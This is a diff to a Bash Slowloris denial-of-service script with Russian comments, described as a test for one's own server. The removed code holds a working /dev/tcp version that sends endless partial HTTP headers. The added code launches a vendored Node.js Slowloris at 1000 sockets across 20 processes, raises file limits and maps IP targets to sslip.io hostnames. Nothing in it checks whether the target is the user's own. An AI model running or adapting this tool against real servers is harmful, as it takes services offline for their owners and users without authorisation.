@@ -1,15 +1,14 @@
 #!/bin/bash
-# Slowloris-тест для собственного сервера.
-# Использование: ./slowloris.sh -h HOST [-p PORT] [-c CONNECTIONS] [-i INTERVAL]
+# Slowloris-тест для собственного сервера (Node.js fork-based).
+# Использование: ./slowloris.sh -h HOST [-p PORT] [-c CONNECTIONS] [-i INSTANCES]
 
 HOST=""
 PORT=80
-CONNECTIONS=200
-INTERVAL=10
-PIDS=()
+CONNECTIONS=1000
+INSTANCES=20
 
 usage() {
-    echo "Использование: $0 -h HOST [-p PORT] [-c CONNECTIONS] [-i INTERVAL]"
+    echo "Использование: $0 -h HOST [-p PORT] [-c CONNECTIONS_PER_INSTANCE] [-i INSTANCES]"
     exit 1
 }
 
@@ -18,48 +17,31 @@ while getopts "h:p:c:i:" opt; do
         h) HOST="$OPTARG" ;;
         p) PORT="$OPTARG" ;;
         c) CONNECTIONS="$OPTARG" ;;
-        i) INTERVAL="$OPTARG" ;;
+        i) INSTANCES="$OPTARG" ;;
         *) usage ;;
     esac
 done
 
 [ -z "$HOST" ] && usage
 
-cleanup() {
-    echo ""
-    echo "[+] Останавливаю, закрываю $( jobs -rp | wc -l ) соединений..."
-    kill "${PIDS[@]}" 2>/dev/null
-    wait 2>/dev/null
-    exit 0
-}
-trap cleanup INT TERM
+SCRIPT="$HOME/slowattack_bash/vendor-slowloris/lib/index.js"
+if [ ! -f "$SCRIPT" ]; then
+    echo "[-] Скрипт не найден: $SCRIPT"
+    echo "    Сначала запустите: bash install.sh"
+    exit 1
+fi
 
-worker() {
-    local id=$1
-    exec {fd}<>"/dev/tcp/$HOST/$PORT" 2>/dev/null || return 1
+ulimit -n 65535 2>/dev/null || true
 
-    printf 'GET /?%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: keep-alive\r\n' \
-        "$RANDOM$id" "$HOST" >&"$fd" 2>/dev/null || { exec {fd}>&-; return 1; }
+PROTO="http"
+if [ "$PORT" = "443" ]; then
+    PROTO="https"
+fi
 
-    while true; do
-        sleep "$INTERVAL"
-        printf 'X-a: %s\r\n' "$RANDOM" >&"$fd" 2>/dev/null || break
-    done
-    exec {fd}>&- 2>/dev/null
-}
+URL_HOST="$HOST"
+if [[ "$HOST" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+    URL_HOST="${HOST}.sslip.io"
+fi
 
-echo "[+] Открываю $CONNECTIONS соединений к $HOST:$PORT ..."
-for ((i = 0; i < CONNECTIONS; i++)); do
-    worker "$i" &
-    PIDS+=($!)
-done
-
-echo "[+] Запущено. Ctrl+C для остановки."
-while true; do
-    ALIVE=0
-    for pid in "${PIDS[@]}"; do
-        kill -0 "$pid" 2>/dev/null && ALIVE=$((ALIVE + 1))
-    done
-    echo "[$(date +%H:%M:%S)] живых воркеров: $ALIVE / $CONNECTIONS"
-    sleep 5
-done
+echo "[+] Атакую $PROTO://$URL_HOST:$PORT — $CONNECTIONS сокетов × $INSTANCES процессов"
+node "$SCRIPT" -p "$PORT" -s "$CONNECTIONS" -i "$INSTANCES" "$PROTO://$URL_HOST"
